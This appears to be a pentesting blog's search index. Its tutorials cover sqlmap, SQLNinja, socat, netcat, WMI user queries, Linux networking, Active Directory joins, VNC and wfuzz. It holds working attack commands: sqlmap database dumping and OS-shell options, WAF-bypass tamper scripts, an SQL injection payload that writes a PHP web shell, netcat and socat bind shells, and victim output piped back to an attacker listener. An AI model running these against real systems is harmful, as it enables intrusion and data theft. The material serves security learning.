sqlmap man pageman sqlmapVerbosity level: 0-6 (default 1)sqlmap -v -u http://www.site.com/vuln.php?id=1Force usage of SSL/HTTPSsqlmap -u http://www.site.com/vuln.php?id=1 --force-sslEnumerate databasessqlmap --dbms=mysql -u \"$URL\" --dbsEnumerate tablessqlmap --dbms=mysql -u \"$URL\" -D \"$DATABASE\" --tablesEnumerate columnssqlmap --dbms=mysql -u \"$URL\" -D \"$DATABASE\" -T \"$TABLE\" --columnsDump table datasqlmap --dbms=mysql -u \"$URL\" -D \"$DATABASE\" -T \"$TABLE\" --dumpSpecify parameter to exploitsqlmap --dbms=mysql -u \"http://www.example.com/param1=value1&amp;amp;param2=value2\" --dbs -p param2Specify parameter to exploit in ‘nice’ URIssqlmap --dbms=mysql -u \"http://www.example.com/param1/value1*/param2/value2\" --dbs # exploits param1Get OS shellsqlmap --dbms=mysql -u \"$URL\" --os-shellGet SQL shellsqlmap --dbms=mysql -u \"$URL\" --sql-shellSQL querysqlmap --dbms=mysql -u \"$URL\" -D \"$DATABASE\" --sql-query \"SELECT * FROM $TABLE;\"Use Tor Socks5 proxysqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u \"$URL\" --dbsBy default, sqlmap will figure out for itself where the injection point is. If you want to guide it, add a * to the URL like this:sqlmap -u http://example/?id=11-(case when 1=1* then 1)Key Flag OptionsFinger Printing-f --fingerprint Perform an extensive DBMS version fingerprintTechnique--technique=TECH SQL injection techniques to use (default \"BEUSTQ\") Boolean-Based Blind Error-Based Union Query Based Stacked Queries Time-BasedOperating System These options can be used to access the back-end database management system underlying the operating system Parameter Description –os-cmd=OSCMD Execute an operating system command –os-shell Prompt for an interactive operating system shell –os-pwn Prompt for an OOB shell, Meterpreter or VNC –os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC –os-bof Stored procedure buffer overflow exploitation –priv-esc Database process user privilege escalation –msf-path=MSFPATH Local path where Metasploit Framework is installed –tmp-path=TMPPATH Remote absolute path of temporary files directory Optimisation Parameter Description -o Turn on all optimisation switches –predict-output Predict common queries output –keep-alive Use persistent HTTP(s) connections –null-connection Retrieve page length without actual HTTP response body –threads=THREADS Max number of concurrent HTTP(s) requests (default 1) –method=METHOD Force usage of given HTTP method (e.g. PUT) –level=LEVEL Level of tests to perform (1-5, default 1) –risk=RISK Risk of tests to perform (1-3, default 1) Enumeration Parameter Description -a, –all Retrieve everything -b, –banner Retrieve DBMS banner –current-user Retrieve DBMS current user –current-db Retrieve DBMS current database –hostname Retrieve DBMS server hostname –is-dba Detect if the DBMS current user is DBA –users Enumerate DBMS users –passwords Enumerate DBMS users password hashes –privileges Enumerate DBMS users privileges –roles Enumerate DBMS users roles –dbs Enumerate DBMS databases –tables Enumerate DBMS database tables –columns Enumerate DBMS database table columns –schema Enumerate DBMS schema –count Retrieve number of entries for table(s) –dump Dump DBMS database table entries –dump-all Dump all DBMS databases tables entries –search Search column(s), table(s) and/or database name(s) –comments Retrieve DBMS comments -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDECOL DBMS database table column(s) to not enumerate -U USER DBMS user to enumerate –sql-query=QUERY SQL statement to be executed –sql-shell Prompt for an interactive SQL shell Brute forceThese options can be used to run brute force checks. Parameter Description –common-tables Check the existence of common tables –common-columns Check the existence of common columns File system accessThese options can be used to access the back-end database management system underlying the file system Parameter Description –file-read=RFILE Read a file from the back-end DBMS file system –file-write=WFILE Write a local file on the back-end DBMS file system –file-dest=DFILE Back-end DBMS absolute filepath to write to Windows registry accessThese options can be used to access the back-end database management system Windows registry. Parameter Description –reg-read Read a Windows registry key value –reg-add Write a Windows registry key value data –reg-del Delete a Windows registry key value –reg-key=REGKEY Windows registry key –reg-value=REGVAL Windows registry key value –reg-data=REGDATA Windows registry key value data –reg-type=REGTYPE Windows registry key value type General Parameter Description –update Update sqlmap –sqlmap-shell Prompt for an interactive sqlmap shell –output-dir=OUT.. Custom output directory path –tmp-dir=TMPDIR Local directory for storing temporary files –forms Parse and test forms on target URL –batch Never ask for user input, use the default behaviour –csv-del=CSVDEL Delimiting character used in CSV output (default “,”) –dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) Tamper Scripts apostrophemask - Replaces apostrophe character with its UTF-8 full width counterpart. ' becomes %EF%BC%87 apostrophenullencode - Replaces apostrophe character with its illegal double unicode counterpart. ' becomes %00%27 appendnullbyte - Appends encoded NULL byte character at the end of payload. %00 base64encode - Base64 all characters in a given payload between - Replaces greater than operator (‘&gt;’) with ‘NOT BETWEEN 0 AND #’. Replaces equals operator (‘=’) with ’BETWEEN # AND # bluecoat - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character = with LIKE operator. chardoubleencode - Double url-encodes all characters in a given payload (not processing already encoded) charencode - Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode - Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) commalesslimit - Replaces instances like ‘LIMIT M, N’ with ‘LIMIT N OFFSET M’ commalessmid - Replaces instances like ‘MID(A, B, C)’ with ‘MID(A FROM B FOR C)’ commentbeforeparenthesis - Prepends (inline) comment before parentheses e.g. 'SELECT ABS(1)' becomes 'SELECT ABS/**/(1)' concat2concatws - Replaces instances like ‘CONCAT(A, B)’ with ‘CONCAT_WS(MID(CHAR(0), 0, 0), A, B)’ equaltolike - Replaces all occurances of operator equal (‘=’) with operator ‘LIKE’ escaptequotes - Slash escape quotes (’ and “) greatest - Replaces greater than operator (‘&gt;’) with ‘GREATEST’ counterpart e.g. '1 AND A &gt; B' becomes '1 AND GREATEST(A,B+1)=A' halfversionedmorekeywords - Adds versioned MySQL comment before each keyword htmlencode - HTML encode (using code points) all non-alphanumeric characters ifnull2ifisnull - Replaces instances like ‘IFNULL(A, B)’ with ‘IF(ISNULL(A), B, A)’ informationschemacomment - Add a comment to the end of all occurrences of (blacklisted) “information_schema” identifier e.g. INFORMATION_SCHEMA.TABLES becomes INFORMATION_SCHEMA/**/.TABLES lowercase - Replaces each keyword character with lower case value modsecurityversioned - Embraces complete query with versioned comment modsecurityzeroversioned - Embraces complete query with zero-versioned comment multiplespaces - Adds multiple spaces around SQL keywords e.g. 1 UNION SELECT foobar becomes 1 UNION SELECT foobar nonrecursivereplacement - Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(“SELECT”, “”)) filters e.g. 1 UNION SELECT 2-- becomes 1 UNIOUNIONN SELESELECTCT 2-- overlongutf8 - Converts all characters in a given payload (not processing already encoded) percentage - Adds a percentage sign (‘%’) infront of each character plus2concat - Replaces plus (‘+’) character with function CONCAT() plus2fnconcat - Replaces plus (‘+’) character with ODBC function {fn CONCAT()} randomcase - Replaces each keyword character with random case value e.g. 'INSERT' becomes 'INseRt' randomcomments - Add random comments to SQL keywords e.g. 'INSERT' becomes 'I/**/N/**/SERT' securesphere - Appends special crafted string sp_password - Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs which happens as a security measure. space2comment - Replaces space character ' ' with comments /**/ space2dash - Replaces space character ' ' with a dash comment '--' followed by a random string and a new line \\n space2hash - Replaces space character ' ' with a pound character '#' followed by a random string and a new line '\\n' space2morecomment - Replaces space character ' ' with comments '/**_**/' space2morehash - Replaces space character ' ' with a pound character '#' followed by a random string and a new line '\\n' space2mssqlblank - Replaces space character ' ' with a random blank character from a valid set of alternate characters space2mysqldash - Replaces space character ' ' with a random blank character from a valid set of alternate characters space2plus - Replaces space character ' ' with plus '+' space2randomblank - Replaces space character ' ' with a random blank character from a valid set of alternate characters symboliclogical - Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and   ) unionalltounion - Replaces UNION ALL SELECT with UNION SELECT unmagicquotes - Replaces quote character (’) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work). e.g. 1' AND 1=1 becomes 1%bf%27-- uppercase - Replaces each keyword character with upper case value varnish - Append a HTTP header ‘X-originating-IP’ to bypass WAF Protection of Varnish Firewall versionedkeywords - Encloses each non-function keyword with versioned MySQL comment e.g. 1 UNION ALL SELECT becomes 1/*!UNION*//*!ALL*//*!SELECT*//*! versionedmorekeywords - Encloses each keyword with versioned MySQL comment xforwardedfor - Append a fake HTTP header ‘X-Forwarded-For’ to bypass WAF (usually application based) protectionBurpsuite IntergrationMake a file with the burpsuite requestroot@evilsaint:/tmp# nano /tmp/burp-post.txtroot@evilsaint:/tmp# cat /tmp/burp-post.txtPOST /register-user HTTP/1.1Host: me.terahost.examUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Referer: http://me.terahost.exam/registerContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 84Cookie: _sid_=eq5bao6a2j3pdch0vl8dmvv9t6; displayoptions=1Connection: closename=test&amp;surname=test&amp;email=test&amp;street_address=test&amp;city=test&amp;zip=test&amp;password=testRun with the -r switchsqlmap -r /tmp/burp-post.txtSQLNinjaOpen Docsfirefox file:///usr/share/doc/sqlninja/sqlninja-howto.htmlFlagsUsage: /usr/bin/sqlninja-m &lt;mode&gt; : Required. Available modes are: t/test - test whether the injection is working f/fingerprint - fingerprint user, xp_cmdshell and more b/bruteforce - bruteforce sa account e/escalation - add user to sysadmin server role x/resurrectxp - try to recreate xp_cmdshell u/upload - upload a .scr file s/dirshell - start a direct shell k/backscan - look for an open outbound port r/revshell - start a reverse shell d/dnstunnel - attempt a dns tunneled shell i/icmpshell - start a reverse ICMP shell c/sqlcmd - issue a 'blind' OS command m/metasploit - wrapper to Metasploit stagers-f &lt;file&gt; : configuration file (default: sqlninja.conf)-p &lt;password&gt; : sa password-w &lt;wordlist&gt; : wordlist to use in bruteforce mode (dictionary method only)-g : generate debug script and exit (only valid in upload mode)-v : verbose output-d &lt;mode&gt; : activate debug 1 - print each injected command 2 - print each raw HTTP request 3 - print each raw HTTP response all - all of the aboveManual SQLi ExampleAn example of making a php backdoor in Xampp server running phpphp?id=738 union all select 1,2,3,4,\"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'" }, { "title": "Socat", "url": "/posts/socat/", "categories": "tutorial", "tags": "socat", "date": "2022-06-13 00:00:00 +0100", "snippet": "Socatsocat [options] &lt;address&gt; &lt;address&gt;You have to provide both addresses for it to work, each address will be made up like thisprotocol:ip:portExamples showing the same functionality ...", "content": "Socatsocat [options] &lt;address&gt; &lt;address&gt;You have to provide both addresses for it to work, each address will be made up like thisprotocol:ip:portExamples showing the same functionality as Netcatnc localhost 80socat - TCP4:localhost:80 OR socat STDIN TCP4:localhost:80nc -lp localhost 700socat TCP4-LISTEN:700 STDOUTnc -lp localhost 700 -e /bin/bashsocat TCP4-LISTEN:700 EXEC:/bin/bashWe can go beyond Netcat with some SSL examples, but first, we need to generate an SSL cert for the server. Generate an SSL certopenssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.keySSL serversocat OPENSSL-LISTEN:443,cert=/cert.pem -SSL clientsocat - OPENSSL:localhost:443Both addresses don’t have to use the same protocol, so you can do ssl server -&gt; non-ssl server. You should also check out the options that you can apply, for example you can use fork to tell socat to listen and handle multiple clients.socat TCP4-LISTEN:5000,fork OPENSSL:localhost:443Finally if you are tunnelling a connection between servers using socat you can use the -v option to print all the traffic to stdout." }, { "title": "Windows Query Logged On Users", "url": "/posts/windows-query-logged-users/", "categories": "article", "tags": "wmic", "date": "2022-06-10 00:00:00 +0100", "snippet": "Query Logged On UsersLogon Types Type Meaning 0 SYSTEM account logon, typically used by the computer itself. 2 Interactive Logon - terminal s...", "content": "Query Logged On UsersLogon Types Type Meaning 0 SYSTEM account logon, typically used by the computer itself. 2 Interactive Logon - terminal services, console, directly interact with the system 3 Network Logon - For things like WMI, SMB, and other remote protocols (non-interactive) 5 Service Logon 10 Remote Interactive Logon On some machines, you may need to enable remoting.netsh firewall set service remoteadmin enableManually with wmic command linewmic logon where LogonType=2 GET LoginID, LogonTypewmic path Win32_LoggedOnUser | find \"273995\"wmic \\node:10.50.1.254 \\user:marvel.lab\\troy.wood \\password:\"password123\" path Win32_LoggedOnUserUsing WMiQuerywmiquery.py 'Administrator:Passw0rd!@10.50.1.254'select LogonType, LogonID from Win32_logonsession where LogonType=2Using PTH-Wmicpth-wmic -U \"marvel.lab\\Administrator%Passw0rd!\" \\\\10.50.1.254 'select LogonType, LogonID from Win32_logonsession where LogonType=2'pth-wmic -U \"marvel.lab\\Administrator%Passw0rd!\" \\\\10.50.1.254 'select * Win32_loggedonuser'Using Sysinternals PsLoggedOn64psexec.py -c \\pentesting\\PsLoggedon64.exe 'marvel.lab\\Administrator:Passw0rd!@10.50.1.15' \"-l -accepteula\"nbtscan -r 10.50.1.0\\24 | grep ^10 | awk '{ print $1 }' &gt; \\tmp\\nbtscan.txtfor ip in $(cat \\tmp\\nbtscan.txt); do psexec.py -c \\pentesting\\PsLoggedon64.exe marvel.lab\\Administrator:Passw0rd\\!@${ip} \"-l -accepteula\"; done &gt;&gt; \\tmp\\loggedon.txt" }, { "title": "Netcat", "url": "/posts/netcat/", "categories": "tutorial", "tags": "netcat", "date": "2022-06-08 00:00:00 +0100", "snippet": "NetcatFirst some brief points about Netcat All official versions are free of charge Works natively on Linux. Works natively on Apple Mac OS X. Works natively on Microsoft Windows. Features a c...", "content": "NetcatFirst some brief points about Netcat All official versions are free of charge Works natively on Linux. Works natively on Apple Mac OS X. Works natively on Microsoft Windows. Features a command-line interface. Source code available for inspection. General-purpose tools Packet crafting toolsThe ncat tool is a much better option in place of netcat or nc.We think ncat is better because of its support for multiple protocols and simultaneous connections and SSL.OverviewThis simple utility reads and writes data across TCP or UDP network connections. It is designed to be a reliable back-end tool to use directly or easily drive by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need, including port binding to accept incoming connections. Netcat can operate in environments where you have low privileges, plus it is a standalone binary, meaning you can upload it to an environment and run it as is.Be warned that file transfers using Netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.Standard Listen and Sendsetup netcat in listening mode and save whatever is received to in.txtroot@box:/tmp/netcat# nc -w 1 -l -p 3000 &gt; in.txtFrom the sending end, we can pipe in a file called out.txt and send it to our listener.nc -w 3 [destination] 3000 &lt; out.txtPiping inputWe can send data by sending output through a pipe to Netcat. Here we are outputting a file, but it could be several items.C:\\Documents and Settings\\user&gt; type c:\\test.txt | c:\\nc.exe 192.168.2.8 3000 -w1On our kali box, we can set a while loop like follows.root@evilsaint:/pentesting/enum# while true; do nc -w 4 -lvp 4321 &gt;&gt; enum.txt; doneAnd we can pipe enumeration commands back to our box.C:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12&gt;ipconfig | nc64.exe 10.1.1.5 4321 -w 3C:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12&gt;net user | nc64.exe 10.1.1.5 4321 -w 3C:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12&gt;net account | nc64.exe 10.1.1.5 4321 -w 3Send with Compression (Linux to Linux)On the receiving endnc -l -p 1234 | uncompress -c | tar xvfp -On the sending endtar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234Sending a harddriveIt is possible using Netcat to pipe a hardriveOn the sender end rundd if=/dev/hda3 | gzip -9 | nc -l 3333On the receiver end,nc [destination] 3333 | pv -b &gt; hd-image.img.gzPort Scanning with NetcatTCP scan of ports 3385 to 3395nc -nvv -w 1 -z 10.0.0.1 3385-3395UDP scan of ports 3385 to 3395nc -unvv -w 1 -z 10.0.0.1 3385-3395Small Bash Loop to loop through all the ports from 1 to 65535 for one IPfor i in $(seq 1 65535); do nc -nv -w 1 -z 10.0.0.1 $i ; doneSmall Bash Loop to loop through all the IPs on our subnet and scan for ports 21-25for i in {1..254}; do nc -vv -n -w 1 10.0.0.$i 21-25 -z; done Option Description -n don’t resolve first just use the IP address and don’t try and use DNS to get a hostname -vv single -v is verbose, double v -vv is extra verbosity. -u UDP mode. -w equals the timeout in seconds for net reads -z Zero I/O mode used for scanning. Makeshift Permanent Netcat Listenernohup is a program you can use to run your application with such that its stdout/stderr can be sent to a file instead and such that closing the parent script won’t SIGHUP the child. However, you need to have the foresight to use it before starting the application. Because of how nohup works, you can’t just apply it to a running process.disown is a bash builtin that removes a shell job from the shell’s job list. This means that you can’t use fg, bg on it anymore, but more importantly, when you close your shell, it won’t hang or send a SIGHUP to that child anymore. Unlike nohup, disown is used after the process has been launched and backgrounded.Make a Netcat listener persistent.while(1) nohup netcat -lvp 4444" }, { "title": "Linux Connectivity", "url": "/posts/linux-connectivity/", "categories": "article", "tags": "networking", "date": "2022-06-06 00:00:00 +0100", "snippet": "Linux Connectivity ifconfig is part of the net-tools package. ip is an alternative command from iproute2util package.View IP Addressesifconfigip aAdding or Deleting an IP Addressifconfigifconfig ...", "content": "Linux Connectivity ifconfig is part of the net-tools package. ip is an alternative command from iproute2util package.View IP Addressesifconfigip aAdding or Deleting an IP Addressifconfigifconfig eth0 add 192.168.80.174ifconfig eth0 del 192.168.80.174ipip a add 192.168.80.174 dev eth0ip a del 192.168.80.174 dev eth0static interface configurations (\\etc\\network\\interfaces).auto loiface lo inet loopbackauto eth0iface eth0 inet static uaddress 192.168.20.9netmask 255.255.255.0gateway 192.0.2.254Add MAC Hardware Address to Network Interfaceifconfigifconfig eth0 hw ether 00:0c:29:33:4e:aaipip link set dev eth0 address 00:0c:29:33:4e:aaEnabling or Disabling Network Interfaceifconfigifconfig eth0 downifconfig eth0 upipip link set dev eth0 downip link set dev eth0 upEnable\\Disable ARP Protocolifconfigifconfig eth0 arpifconfig eth0 -arpipip link set dev eth0 arp onip link set dev eth0 arp offGateway and Routesrouteroute add default gw &lt;ip&gt;route add -net 192.168.10.0 netmask 255.255.255.0 dev eth0routeipip route add default via &lt;gw addr&gt;ip route add &lt;ip&gt; via &lt;gw addr&gt; dev &lt;interface&gt;ip route showDHCPRequest IP Address (Sends broadcast)dhclientMore advanced request, forces IPv4, against the specified server for the specified interfacedhclient -4 -s 10.128.128.128 eth0vConfigCheck if 8021q is loaded:lsmod | grep 8021qIf not:modprobe 8021qAdd vConfigvconfig add eth0 5Check:ifconfig eth0.5ifconfig eth0.5 192.168.1.100 netmask 255.255.255.0 broadcast 192.168.1.255 upifconfig eth0.5 x.x.x.x netmask x.x.x.x broadcast x.x.x.x upTo delete:ifconfig eth0.5 downvconfig rem eth0.5OR:ip link add link eth0 name eth0.5 type vlan id 5ip linkip -d link show eth0.5You need to activate and add an IP address to vlan link, type:ip addr add 192.168.1.200\\24 brd 192.168.1.255 dev eth0.5ip link set dev eth0.5 upTo remove:ip link set dev eth0.5 downip link delete eth0.5" }, { "title": "Git Error - fatal: protocol error: bad line length character", "url": "/posts/git-error-fatal-protocol-error-bad-line-length-character/", "categories": "blog", "tags": "git", "date": "2022-06-05 00:00:00 +0100", "snippet": "On the weekend I ran into an problem with Git that couldnt debugfatal: protocol error: bad line length character: Warnhttps://stackoverflow.com/questions/8170436/git-remote-error-fatal-protocol-err...", "content": "On the weekend I ran into an problem with Git that couldnt debugfatal: protocol error: bad line length character: Warnhttps://stackoverflow.com/questions/8170436/git-remote-error-fatal-protocol-error-bad-line-length-character-unab" }, { "title": "Connecting Linux To Active Directory", "url": "/posts/connecting-linux-active-directory/", "categories": "article", "tags": "active-direction, linux", "date": "2022-06-01 00:00:00 +0100", "snippet": "Connecting Linux To Active DirectoryChange Password of AD User from LinuxChange the password of a regular user with net rpcroot@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10Enter ...", "content": "Connecting Linux To Active DirectoryChange Password of AD User from LinuxChange the password of a regular user with net rpcroot@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10Enter new password for adminuser:Enter helpdesk's password:root@kali:~#Change the password of a regular user with rpcclientroot@kali:~# rpcclient -U helpdesk \\\\192.168.80.10Enter helpdesk's password:rpcclient $&gt; setuserinfo2 normaluser 23 'Passw0rd!'Connect CentOS to Active DirectoyInstall the following packagesyum install sssd realmd oddjob oddjob-mkhomedir adcli samba-common samba-common-tools krb5-workstation openldap-clients policycoreutils-pythonUpdate the /etc/hosts file192.168.0.151 adserver.example.com adserverContents of resolv.conf should be something like belowcat /etc/resolv.confsearch example.comnameserver 192.168.0.151Join the domainrealm join --user=tech adserver.example.comPassword for tech:Verify we are now joined.realm listCheck an verify users with full domainid linuxtechi@example.comTo make this work without full domainnano /etc/sssd/sssd.confuse_fully_qualified_names = Falsefallback_homedir = /home/%uConnect Debian to Active DirectoyConfigure the network interfacesnano /etc/network/interfacesAdd the ip address of the domain controller like followsauto ens192iface ens192 inet staticaddress 10.100.1.250gateway 10.100.1.1network 10.100.1.0broadcast 10.100.1.255dns-nameservers 10.100.1.254Restart the interface config/etc/init.d/networking restartInstall the following packagesapt -y install realmd sssd sssd-tools adcli krb5-user packagekit samba-common samba-common-bin samba-libs resolvconfnano 5.conf[logging] Default = FILE:/var/log/krb5.log[libdefaults] ticket_lifetime = 24000 clock-skew = 300 default_realm = MARVEL.LAB# dns_lookup_realm = false# dns_lookup_kdc = true[realms] MARVEL.LAB = { kdc = DC01.MARVEL.LAB:88 admin_server = DC01.MARVEL.LAB:464 default_domain = MARVEL.LAB}[domain_realm] .server.com = MARVEL.LAB server.com = MARVEL.LABVerify connectionkinit Administrator@MARVEL.LABklistExtra config to come back and dohttps:.debian.orgInstall the following tools apt-get install winbind sambanano .conf[global] security = ads realm = MARVEL.LAB password server = 10.100.1.254 workgroup = test# winbind separator = + idmap uid = 10000-20000 idmap gid = 10000-20000 winbind enum users = yes winbind enum groups = yes template homedir = \\home\\%D\\%U template shell = \\bin\\bash client use spnego = yes client ntlmv2 auth = yes encrypt passwords = yes winbind use default domain = yes restrict anonymous = 2 domain master = no local master = no preferred master = no os level = 0Add the following line to the bottom of the common-session pam modulenano /etc/pam.d/common-session# add to the end if need (create home directory automatically at initial login)session optional pam_mkhomedir.so skel=/etc/skel umask=077Join to domainrealm join marvel.lab" }, { "title": "Exploring VNC Servers And Clients", "url": "/posts/exploring-vnc-servers-and-clients/", "categories": "article", "tags": "vnc", "date": "2022-05-29 00:00:00 +0100", "snippet": "VNC Servers &amp; ClientsVNC works on a client and server model. A server component is installed on the remote computer (the one you wish to control), and a VNC viewer (the client) is installed on ...", "content": "VNC Servers &amp; ClientsVNC works on a client and server model. A server component is installed on the remote computer (the one you wish to control), and a VNC viewer (the client) is installed on the computer from where you want to take control. Over the VNC protocol, the remote computer with the agent installed will transmit a copy of the remote computer’s screen to the viewer. The most common VNC Server I found myself using was TigerVNC which is forked off of TightVNC. It allows users to create an independent session. However, it can not do shared screens or allow requesting assistance so its mileage on pentests is limited to just the protocol. If however, you have a choice between the two then x11vnc can turn out a little better on pentests.Tiger VNCWebsite: http://tigervnc.orgTight VNC and Tiger VNC originated from the same project. Tiger VNC branched off from the never released VNC 4 branch of TightVNC. It has a GPL license and is free for personal and commercial use. It can operate as a server and client on MS Windows, Linux and FreeBSD. On Mac, it can just act as a client. It supports SSL/TLS Encryption.Unfortunately, TigerVNC doesn’t support File Transfer.InstallingIf you install the vnc4server package it will also install tigervnc-standalone-server, which has replaced tigervnc-serverapt-get install vnc4serverMade up of the following commands vncconfig vncpasswd vncserver vncviewer x0vncserver XvncRunning a VNC ServerThe following line runs vncserver . The -name parameter allows us to specify a display name for the session window. We can use the -geometry to specify dimensions (WxH) for the connecting session. We can specify the colour depth (16/24/32) using the -depth parmeter. The -localhost parameter can be yes or no as whether or not to listen locally. Adding -cleanstale tells TigerVNC Server to clean up any stale files before trying to work out what x display number is available. Lastly -autokill kills the TigerVNCvncserver -name \"My Window Title\" -geometry \"1600x1000\" -depth 24 -localhost no -cleanstale -autokillIf you have been working on any previous connections and you don’t want to worry about closing them down before starting a new session then you can append on the following command to kill all previously existing server sessions.-kill :*Depending on your target audience, you can also specifyNever treat incoming connections as shared. If a second person connects it disconnects. Good option as you at least know if someone is connected.--NeverSharedAlways treat the session as shared. If you share the connection and use the ‘view only’ password, you can perform a presentation to many.-AlwaysSharedSpecify the allowed users-AllowedUsers usersManage VNC SessionsTo list any VNC Sessions that have been setup.vncserver -listKill a display (or all displays)vncserver -kill :1vncserver -kill :*AuthenticationFor your session, you will need to authenticateThe VNC Password is stored in /.vnc.passwd of the person who started the service. Type the following to be prompted for a password.vncpasswdA nice way to connect is over SSHvncviewer -via root@46.101.90.247 :1ConfigurationThe ~/.vnc/Xvnc-session file used to be ~/.vnc/xstartup and because of such, TigerVNC will check both. The file /etc/vnc.conf is the global configuration file. Passwords are stored in ~/.vnc/passwdx11vnchttp://www.karlrunge.com/x11vnc/Has TightVNC and UltraVNC file transfer built-in along with built-in SSL encryption and authentication. Runs of the command line Supports lots of graphical environmentsInstallingOn Debian Linux, it is normally an easy install with the package managerapt-get install x11vncWith centos 9 you need to pull down the binarywget http://dl.fedoraproject.org/pub/epel/7/x86_64/x/x11vnc-0.9.13-11.el7.x86_64.rpmyum install Xvfbyum install libvncserveryum install tkrpm -i --allfiles -v x11vnc-0.9.13-11.el7.x86_64.rpmRunning a VNC ServerTo set a password file for x11vnc, use the -storepasswd parameter. By default, it will save it in ~/.vnc/passwd unless you specify it elsewherex11vnc -storepasswdRun a session specify a clear-text password credential of ‘truffle’x11vnc -passwd truffleThe -forever flag will keep x11vnc listening for further connections rather than exiting.x11vnc -passwd truffle -foreverWe can specify the window geometry of connections along with a namex11vnc -passwd truffle -forever -desktop \"Desktop Name\"Instead of specify a plain text password on the command line you can include your file. If you want to put your password in plain text in a file you can simply use -passwdfile. However more commonly you will want to use the password you created with the -storepasswd flag and for that you specify -rfbauthx11vnc -forever -desktop \"Desktop Name\" -passwdfile /root/unencrypted-passx11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwdA good idea is to also restrict access based on ip address if possible.x11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwd -allow xx.xxx.xx.xxxIf you need to run x11vnc on a non-standard port you can specify it with the -rfbportx11vnc -forever -desktop \"Desktop Name\" -passwdfile /root/.vnc/cleartext -rfbport 7777A secondary password can be supplied for those only allowed to view the sessionx11vnc -forever -desktop \"Desktop Name\" -rfbauth /root/.vnc/passwd -viewpasswd \"no-touching!\" -tightfilexfer Enable the TightVNC file transfer extension. -ultrafilexfer Enable UltraVNC filetransfer Option Description -shared When display is shared more than one person can connect at once. (defaults to off) -geometry WxH -forever Keep listening for more connections rather than exiting. -once Exit after the first successfully connected viewer disconnects -allow Specify the IP addresses (separated by commas) of the allowed hosts -unixpw List of comma-separated user names of system users that can login -ssl Use the openssl library to provide a built-in encrypted SSL/TLS tunnel between server and viewers -passwd Add a plain password to the connection -desktop Set Desktop name for clients -chatwindow Place a local UltraVNC chat window on the X11 display Viewing VNCOn client install the VNC viewerapt-get install xtightvncviewerThe basic syntax for viewing the server.vncviewer 54.244.102.175If the server is running on a different display (n = display number)vncviewer 54.244.102.175:nIf we get tired of typing out a password on the terminal, we can reference it via a filevncviewer 45.76.134.217 -passwd &lt;path to my password file&gt;An alternative to the Tight VNC Viewer is SSVNC, an enhanced version of Tight VNC with support for more encodings, colour modes, and extensions.apt-get install ssvncssvncviewer 46.101.74.11:1" }, { "title": "Wfuzz", "url": "/posts/wfuzz/", "categories": "article", "tags": "brute-force, web", "date": "2022-05-22 00:00:00 +0100", "snippet": "WfuzzWfuzz provides some highly customisable fuzzing options that take it beyond a simple hidden content discovery tool.You must be familiar with a few non-obvious options before you use the tool. ...", "content": "WfuzzWfuzz provides some highly customisable fuzzing options that take it beyond a simple hidden content discovery tool.You must be familiar with a few non-obvious options before you use the tool. Flag Description -e List of available encoders/payloads/iterators/printers/scripts -c Output with colours -z payload -R depth Recursive path Discovery –hc Hide content, so for example, hide 404 results. –sc Show content with specified code, i.e. 200 -p addr Use Proxy in format ip:port:type FUZZ The parameter you want fuzzing. If you use the -V option, this is unnecessary as it will do all parameters. Installing the toolsudo apt install wfuzzTypical usage syntax.wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://website/FUZZLook for pages ending in a .php extension.wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://website/FUZZ.phpOutputWe can fuzz via a proxy using the -p option syntax.wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt -p 127.0.0.1:8080 http://website/FUZZWhen writing to a file, wfuzz has some choices. To see available formatswfuzz -e printersWe can specify a format like sowfuzz -f nonauth.txt,raw -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZwfuzz -f myoutput,html -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZwfuzz -f moreoutput,json -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZwfuzz -f anotheroutput,magictree -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://website/FUZZCookiesWe can add cookies to our syntax (if the cookies contain characters that will escape the bash shell you need to quote them)wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -b mycookie=true -b secondcookies=joiQXV0aFNlcnZlciIsImp http://website/FUZZCookies can also be fuzzed using the FUZZ keywordwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -b mycookie=FUZZ http://website/FUZZUseragentSome filters might be looking for common tool user-agent signatures. You can specify one as followswfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -H \"User-Agent: evilbrowser\" http://website/FUZZRecursionTo instruct recursion simply add the -R parameter followed by a depthwfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404 -R1 https://pentesting.optasense.com/FUZZScriptsSome locations where 